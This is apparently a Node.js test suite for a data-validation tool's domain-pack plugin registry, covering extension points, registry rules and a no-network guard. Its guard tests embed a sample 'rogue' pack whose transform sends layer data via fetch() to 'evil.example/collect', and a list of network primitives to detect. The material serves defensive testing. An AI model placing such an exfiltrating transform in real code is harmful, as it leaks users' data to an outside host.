// ============================================================
// DATAGLOW — Gen 40 domain-pack plugin architecture test suite
// ============================================================
// Proves the plugin architecture is a PURE refactor and that the no-network
// guarantee is enforced (not merely conventional). Covers, in order:
//
//   1. Extension points — the closed vocabulary a pack manifest may fill.
//   2. No-network guard — the static source scan and the runtime trap, incl. a
//      test-only, NOT-shipped pack that attempts fetch() being caught.
//   3. Every SHIPPED pack file scanned clean (the CI backstop).
//   4. Registry validation — manifests, semver, id↔name, unknown extension
//      points, inter-pack dependencies, and network-carrying sources rejected.
//   5. Identical behaviour — applyDomainPack produces byte-identical output
//      whether packs come from the legacy inline map or the plugin registry.
//   6. describeLoadedPacks — the provenance surfaced on the public trust page.
//
// Pure JS + fs only — no DuckDB, DOM, or network. RUN WITH:
//   node test/pack-architecture.test.mjs

import { readFileSync, readdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

import {
  EXTENSION_POINTS, EXTENSION_POINT_IDS, isExtensionPoint,
} from '../js/packs/extension-points.js';
import {
  NETWORK_PRIMITIVES, scanSourceForNetwork, assertNoNetwork, runWithNetworkDenied,
} from '../js/packs/pack-network-guard.js';
import {
  PackRegistry, loadBuiltInPacks, BUILT_IN_PACK_PLUGINS,
} from '../js/packs/pack-registry.js';
import {
  applyDomainPack, summarizeUnitTests, DOMAIN_PACKS,
  setPackSource, resetPackSource,
} from '../js/validation/domain-physics.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const PACKS_DIR = join(__dirname, '..', 'js', 'packs');

// ---------- tiny test harness (no framework) ----------
let passed = 0;
let failed = 0;
function ok(cond, msg) {
  if (cond) { passed++; console.log(`✓ ${msg}`); }
  else { failed++; console.log(`✗ FAILED: ${msg}`); }
}
function throws(fn, re, msg) {
  try { fn(); ok(false, `${msg} (expected throw)`); }
  catch (e) { ok(re ? re.test(e.message) : true, `${msg}${re ? '' : ''}`); }
}
function deepEqual(a, b) {
  if (a === b) return true;
  if (typeof a !== typeof b) return false;
  if (a && b && typeof a === 'object') {
    if (Array.isArray(a) !== Array.isArray(b)) return false;
    const ka = Object.keys(a), kb = Object.keys(b);
    if (ka.length !== kb.length) return false;
    return ka.every(k => deepEqual(a[k], b[k]));
  }
  return false;
}

// Recursively list every .js file under js/packs/ (shipped pack code).
function listPackSourceFiles(dir) {
  const out = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, entry.name);
    if (entry.isDirectory()) out.push(...listPackSourceFiles(p));
    else if (entry.name.endsWith('.js')) out.push(p);
  }
  return out;
}

// The scenarios that actually fire built-in pack rules, so the identical-
// behaviour proof exercises real transforms rather than empty no-ops. Each
// returns a FRESH { layerResults, columns } (applyDomainPack mutates in place).
function scenarios() {
  return [
    {
      pack: 'healthcare',
      label: 'de-id far-future date downgrade',
      make: () => {
        const findings = [
          { kind: 'future_date', column: 'admit_date', severity: 'fail', text: 'future', meta: { farFutureShare: 0.99 } },
          { kind: 'future_date', column: 'note_date', severity: 'fail', text: 'future', meta: { farFutureShare: 0.05 } },
        ];
        return {
          layerResults: { unit_tests: { ...summarizeUnitTests(findings), findings } },
          columns: [
            { name: 'admit_date', type: 'DATE', numeric: false, isBinary01: false },
            { name: 'note_date', type: 'DATE', numeric: false, isBinary01: false },
          ],
        };
      },
    },
    {
      pack: 'healthcare',
      label: 'protected-category no-merge + binary Benford exemption',
      make: () => ({
        layerResults: {
          categorical_consistency: {
            status: 'warn', detail: [],
            clusters: [
              { column: 'race', canonical: 'A', variants: [{ value: 'A', count: 5 }], merges: [{ from: 'A ', to: 'A', count: 3 }], sensitive: false },
              { column: 'city', canonical: 'Paris', variants: [{ value: 'Paris', count: 5 }], merges: [{ from: 'paris', to: 'Paris', count: 3 }], sensitive: false },
            ],
          },
          benford: { status: 'warn', detail: ['"mortality_flag": deviates'], flags: ['"mortality_flag": deviates'], skips: [] },
        },
        columns: [
          { name: 'race', type: 'VARCHAR', numeric: false, isBinary01: false },
          { name: 'city', type: 'VARCHAR', numeric: false, isBinary01: false },
          { name: 'mortality_flag', type: 'BIGINT', numeric: true, isBinary01: true },
        ],
      }),
    },
    {
      pack: 'retail',
      label: 'return-flag Benford exemption',
      make: () => ({
        layerResults: { benford: { status: 'warn', detail: ['"is_returned": deviates'], flags: ['"is_returned": deviates'], skips: [] } },
        columns: [{ name: 'is_returned', type: 'BIGINT', numeric: true, isBinary01: true }],
      }),
    },
    {
      pack: 'finance',
      label: 'reconciliation-flag Benford exemption',
      make: () => ({
        layerResults: { benford: { status: 'warn', detail: ['"is_reconciled": deviates'], flags: ['"is_reconciled": deviates'], skips: [] } },
        columns: [{ name: 'is_reconciled', type: 'BIGINT', numeric: true, isBinary01: true }],
      }),
    },
    {
      pack: 'none',
      label: 'no-op leaves raw output untouched',
      make: () => {
        const findings = [{ kind: 'future_date', column: 'admit_date', severity: 'fail', text: 'future', meta: { farFutureShare: 0.99 } }];
        return {
          layerResults: { unit_tests: { ...summarizeUnitTests(findings), findings } },
          columns: [{ name: 'admit_date', type: 'DATE', numeric: false, isBinary01: false }],
        };
      },
    },
  ];
}

function main() {
  // ============================================================
  // 1. Extension points
  // ============================================================
  const REQUIRED_POINTS = ['validation-rules', 'cleaning-fixes', 'anomaly-detectors', 'teaching-notes', 'sample-datasets', 'vocabulary'];
  ok(EXTENSION_POINT_IDS.length >= 6, `extension-points: at least 6 defined (got ${EXTENSION_POINT_IDS.length})`);
  ok(REQUIRED_POINTS.every(p => isExtensionPoint(p)), 'extension-points: the six required seams are all present');
  ok(!isExtensionPoint('not-a-point'), 'extension-points: an unknown id is rejected');
  ok(Object.isFrozen(EXTENSION_POINTS) && Object.isFrozen(EXTENSION_POINT_IDS), 'extension-points: the vocabulary is frozen');
  ok(REQUIRED_POINTS.every(p => typeof EXTENSION_POINTS[p] === 'string' && EXTENSION_POINTS[p].length > 0),
    'extension-points: every point documents a one-line contract');

  // ============================================================
  // 2. No-network guard — static scan + runtime trap
  // ============================================================
  ok(NETWORK_PRIMITIVES.includes('fetch') && NETWORK_PRIMITIVES.includes('XMLHttpRequest'),
    'guard: the primitive list covers fetch and XMLHttpRequest');

  // A test-only, NEVER-SHIPPED "malicious" pack that tries to phone home. This
  // is the required proof that the guard catches a real violation.
  const BAD_PACK_SOURCE = `
    export const pack = {
      name: 'exfil', label: 'Exfil', rules: [{
        appliesToLayer: 'benford', match: () => true,
        transform: async (layer) => {
          await fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(layer) });
          return layer;
        },
      }],
    };
  `;
  const badViolations = scanSourceForNetwork(BAD_PACK_SOURCE);
  ok(badViolations.some(v => v.primitive === 'fetch'), 'guard(scan): flags fetch() in a rogue pack');
  ok(badViolations.every(v => typeof v.line === 'number' && v.line > 0), 'guard(scan): reports a 1-based line for each violation');
  throws(() => assertNoNetwork(BAD_PACK_SOURCE, 'exfil'), /no-network guard/, 'guard(assert): throws on a rogue pack');

  // Multiple primitives + XHR are all caught.
  ok(scanSourceForNetwork('const x = new XMLHttpRequest(); const w = new WebSocket("");').length >= 2,
    'guard(scan): catches XMLHttpRequest and WebSocket');

  // Comment/string mentions must NOT trip the scan (only real code counts).
  ok(scanSourceForNetwork('// this pack must never call fetch\nconst n = 1;').length === 0,
    'guard(scan): a primitive named only in a comment is not a violation');
  ok(scanSourceForNetwork('const msg = "do not use fetch here";').length === 0,
    'guard(scan): a primitive named only in a string is not a violation');
  ok(scanSourceForNetwork('const t = `template with fetch word`;').length === 0,
    'guard(scan): a primitive named only in a template literal is not a violation');

  // Clean pack-wrapper source scans clean.
  ok(assertNoNetwork('export const pack = { name: "ok", rules: [] };', 'ok') === undefined,
    'guard(assert): a clean pack passes');

  // Runtime trap: fetch is blocked while fn runs, restored afterward.
  {
    const before = globalThis.fetch;
    let threw = false;
    const rv = runWithNetworkDenied(() => {
      try { globalThis.fetch('https://evil.example'); } catch { threw = true; }
      return 42;
    });
    ok(threw, 'guard(trap): fetch() throws inside runWithNetworkDenied');
    ok(rv === 42, 'guard(trap): returns the callback result');
    ok(globalThis.fetch === before, 'guard(trap): the original fetch is restored afterward');
  }
  // Trap restores even when the callback throws.
  {
    const before = globalThis.fetch;
    try { runWithNetworkDenied(() => { throw new Error('boom'); }); } catch { /* expected */ }
    ok(globalThis.fetch === before, 'guard(trap): restores globals even if the callback throws');
  }

  // ============================================================
  // 3. Every SHIPPED pack file scans clean (CI backstop)
  // ============================================================
  {
    const files = listPackSourceFiles(PACKS_DIR);
    ok(files.length >= 9, `guard(ship): found the shipped pack modules to scan (${files.length})`);
    let allClean = true;
    for (const f of files) {
      const v = scanSourceForNetwork(readFileSync(f, 'utf8'));
      if (v.length) { allClean = false; console.log(`   ↳ ${f}: ${v.map(x => x.primitive).join(', ')}`); }
    }
    ok(allClean, 'guard(ship): no shipped pack file references a network primitive');
  }

  // ============================================================
  // 4. Registry validation
  // ============================================================
  const registry = loadBuiltInPacks();
  ok(BUILT_IN_PACK_PLUGINS.length === 6, 'registry: six built-in pack plugins');
  ok(registry.list().length === 6, 'registry: loadBuiltInPacks registers all six');
  ok(['none', 'healthcare', 'retail', 'finance', 'omop', 'fhir'].every(id => registry.has(id)),
    'registry: every expected pack id is present');

  for (const { manifest, pack } of BUILT_IN_PACK_PLUGINS.map(p => ({ manifest: p.manifest, pack: p.pack }))) {
    ok(manifest.id === pack.name, `registry: "${manifest.id}" manifest id matches pack.name`);
    ok(/^\d+\.\d+\.\d+/.test(manifest.version), `registry: "${manifest.id}" version is semver`);
    ok(typeof manifest.industry === 'string' && manifest.industry.length > 0, `registry: "${manifest.id}" declares an industry`);
    ok(Object.keys(manifest.capabilities || {}).every(isExtensionPoint), `registry: "${manifest.id}" capabilities are all known extension points`);
  }

  // Duplicate id rejected.
  throws(() => { const r = new PackRegistry(); r.register(BUILT_IN_PACK_PLUGINS[0]); r.register(BUILT_IN_PACK_PLUGINS[0]); },
    /duplicate pack id/, 'registry: duplicate pack id rejected');
  // Non-semver version rejected.
  throws(() => new PackRegistry().register({ manifest: { id: 'x', version: 'v1', industry: 'X', capabilities: {} }, pack: { name: 'x', rules: [] } }),
    /semver/, 'registry: non-semver version rejected');
  // id / pack.name mismatch rejected.
  throws(() => new PackRegistry().register({ manifest: { id: 'x', version: '1.0.0', industry: 'X', capabilities: {} }, pack: { name: 'y', rules: [] } }),
    /must match pack.name/, 'registry: id/pack.name mismatch rejected');
  // Unknown extension point rejected.
  throws(() => new PackRegistry().register({ manifest: { id: 'x', version: '1.0.0', industry: 'X', capabilities: { 'bogus-point': true } }, pack: { name: 'x', rules: [] } }),
    /unknown extension point/, 'registry: unknown extension point rejected');
  // Inter-pack dependency rejected (isolation).
  throws(() => new PackRegistry().register({ manifest: { id: 'x', version: '1.0.0', industry: 'X', capabilities: {}, dependencies: { healthcare: '1.0.0' } }, pack: { name: 'x', rules: [] } }),
    /must not declare inter-pack dependencies/, 'registry: inter-pack dependency rejected');
  // A pack whose shipped source references the network is rejected at registration.
  throws(() => new PackRegistry().register({ manifest: { id: 'exfil', version: '1.0.0', industry: 'X', capabilities: {} }, pack: { name: 'exfil', rules: [] }, source: BAD_PACK_SOURCE }),
    /no-network guard/, 'registry: a pack carrying network source is rejected');

  // ============================================================
  // 5. Identical behaviour — legacy inline map vs plugin registry
  // ============================================================
  const packMap = registry.toPackMap();
  ok(Object.keys(packMap).sort().join(',') === Object.keys(DOMAIN_PACKS).sort().join(','),
    'identical: plugin pack map has exactly the legacy pack ids');
  ok(Object.keys(DOMAIN_PACKS).every(k => packMap[k] === DOMAIN_PACKS[k]),
    'identical: plugin map reuses the SAME runtime pack objects (byte-for-byte)');

  // summarizeUnitTests() stamps its output with Date.now(). The legacy and
  // plugin runs below execute a few milliseconds apart, so a free-running clock
  // makes their timestamps differ and the byte-for-byte comparison flakes (the
  // healthcare de-id rule is worst-affected — it re-summarizes, so it carries a
  // second, later stamp). Freeze the clock across both runs so the comparison
  // reflects pack behaviour, not wall-clock skew.
  const realNow = Date.now;
  Date.now = () => 1_700_000_000_000;
  try {
    for (const sc of scenarios()) {
      // Legacy source (default).
      resetPackSource();
      const legacyIn = sc.make();
      const legacySummary = applyDomainPack(legacyIn.layerResults, sc.pack, { columns: legacyIn.columns });

      // Plugin source.
      setPackSource(packMap);
      const pluginIn = sc.make();
      const pluginSummary = applyDomainPack(pluginIn.layerResults, sc.pack, { columns: pluginIn.columns });
      resetPackSource();

      ok(deepEqual(legacyIn.layerResults, pluginIn.layerResults),
        `identical[${sc.pack}]: ${sc.label} — mutated layer output matches`);
      ok(deepEqual(legacySummary, pluginSummary),
        `identical[${sc.pack}]: ${sc.label} — pack summary/annotations match`);
    }
  } finally {
    Date.now = realNow;
  }

  // ============================================================
  // 6. describeLoadedPacks — the public trust/audit surface
  // ============================================================
  const described = registry.describeLoadedPacks();
  ok(described.length === 6, 'trust: describeLoadedPacks lists all six packs');
  ok(described.every(p => p.id && p.version && p.industry && Array.isArray(p.extensionPoints)),
    'trust: each entry carries id, version, industry, and extension points');
  const hc = described.find(p => p.id === 'healthcare');
  ok(hc && hc.provenance && /disclaimer/i.test(JSON.stringify(hc.provenance)),
    'trust: healthcare provenance carries the non-clinical disclaimer');
  const fin = described.find(p => p.id === 'finance');
  ok(fin && fin.provenance && /no.*sample|none/i.test(JSON.stringify(fin.provenance)),
    'trust: finance provenance records that no sample data is shipped');

  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed > 0 ? 1 : 0);
}

main();
